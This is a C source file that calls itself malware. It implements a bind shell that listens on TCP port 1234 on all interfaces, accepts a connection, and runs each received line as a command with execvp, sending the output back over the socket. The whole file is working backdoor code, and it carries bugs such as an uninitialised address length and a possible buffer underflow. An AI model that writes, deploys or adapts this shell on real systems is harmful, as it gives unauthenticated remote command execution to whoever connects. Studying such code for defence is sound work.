#include <stdio.h>
#include <netinet/in.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <sys/wait.h> 
#include <unistd.h>
#include <errno.h>

int
main(void)
{
	printf("Starting the malware\n");

	int sock_serv;
	sock_serv = socket(AF_INET, SOCK_STREAM, 0);
	if (sock_serv == -1) {
		printf("Failed to create the socket, err: %s\n", strerror(errno));
		goto _EXIT;
	}

	int res;

	int sock_opt;
	sock_opt = 1;
	res = setsockopt(sock_serv, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof (sock_opt));
	if (res == -1) {
		printf("Failed to set REUSEADDR option, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	res = setsockopt(sock_serv, SOL_SOCKET, SO_REUSEPORT, &sock_opt, sizeof (sock_opt));
	if (res == -1) {
		printf("Failed to set REUSEPORT option, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	struct sockaddr_in addr_serv;
	bzero(&addr_serv, sizeof (addr_serv));

	addr_serv.sin_family = AF_INET; 
	addr_serv.sin_addr.s_addr = htonl(INADDR_ANY); 
	addr_serv.sin_port = htons(1234); 

	res = bind(sock_serv, (struct sockaddr*)&addr_serv, sizeof (addr_serv));
	if (res == -1) {
		printf("Failed to bind the socket, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	res = listen(sock_serv, 1);
	if (res == -1) {
		printf("Failed to listen for connections, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	int sock_client;
	struct sockaddr_in addr_client;
	socklen_t addr_client_len;
	sock_client = accept(sock_serv, (struct sockaddr*)&addr_client, &addr_client_len);
	if (sock_client == -1) {
		printf("Failed to accept the connection, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	char prompt[] = "malware> ";
	ssize_t bytes;
	bytes = write(sock_client, prompt, sizeof (prompt) - 1);
	if (bytes == -1) {
		printf("Connection closed, err: %s\n", strerror(errno));
		goto _CLOSE_SOCKET;
	}

	size_t args_cap;
	size_t args_len;
	char **args_vec;

	args_cap = 32;
	args_len = 0;
	args_vec = NULL;

	char buff[1024];
	while (1) {
		bzero(buff, sizeof (buff));
		bytes = read(sock_client, buff, sizeof (buff));
		if (bytes == -1) {
			printf("Connection closed, err: %s\n", strerror(errno));
			goto _CLOSE_SOCKET;
		}

		printf("< (%zi) %.*s", bytes, (int)bytes, buff);

		// fix telnet newline
		buff[bytes - 2] = '\0';

		if (strcmp(buff, "quit") == 0) {
			printf("Connection closed by the client\n");
			close(sock_client);
			break;
		}

		int com[2];
		res = pipe(com);
		if (res == -1) {
			printf("Failed to create communication pipes, err: %s\n", strerror(errno));
			goto _CLOSE_SOCKET;
		}

		pid_t pid = vfork();
		if (pid == -1) {
			printf("Failed to create a child process, err: %s\n", strerror(errno));
			goto _CLOSE_SOCKET;
		}

		if (pid == 0) {
			args_len = 0;
			args_cap = 32;
			args_vec = malloc(sizeof (char*) * args_cap);
			if (args_vec == NULL) {
				printf("Failed to allocate memory for arguments vector, err: %s\n", strerror(errno));
				goto _CLOSE_SOCKET;
			}

			char *tok;
			tok = strtok(buff, " ");
			while (tok != NULL) {
				if (args_len >= args_cap) {
					args_cap *= 2;

					char **args_tmp;
					args_tmp = realloc(args_vec, sizeof (char*) * args_cap);
					if (args_tmp == NULL) {
						free(args_vec);
						printf("Failed to reallocate memory for arguments vector, err: %s\n", strerror(errno));
						goto _CLOSE_SOCKET;
					}

					args_vec = args_tmp;
				}

				args_vec[args_len] = tok;
				tok = strtok(NULL, " ");
				
				++args_len;
			}

			if (args_len >= args_cap) {
				args_cap *= 2;

				char **args_tmp;
				args_tmp = realloc(args_vec, sizeof (char*) * args_cap);
				if (args_tmp == NULL) {
					free(args_vec);
					printf("Failed to reallocate memory for arguments vector, err: %s\n", strerror(errno));
					goto _CLOSE_SOCKET;
				}

				args_vec = args_tmp;
			}
			args_vec[args_len] = NULL;

			close(com[0]);
			dup2(com[1], STDOUT_FILENO);

			execvp(args_vec[0], args_vec);
			_exit(EXIT_FAILURE);
		} else {
			close(com[1]);

			bytes = read(com[0], buff, sizeof (buff));
			close(com[0]);

			printf("> (%zi) %.*s\n", bytes, (int)bytes, buff);
		
			bytes = write(sock_client, buff, bytes);
			if (bytes == -1) {
				printf("Connection closed, err: %s\n", strerror(errno));
				goto _CLOSE_SOCKET;
			}

			bytes = write(sock_client, prompt, sizeof (prompt) - 1);
			if (bytes == -1) {
				printf("Connection closed, err: %s\n", strerror(errno));
				goto _CLOSE_SOCKET;
			}
		}
	}

	free(args_vec);
_CLOSE_SOCKET:
	close(sock_serv);
_EXIT:
	printf("Ending the malware\n");
	return 0;
}
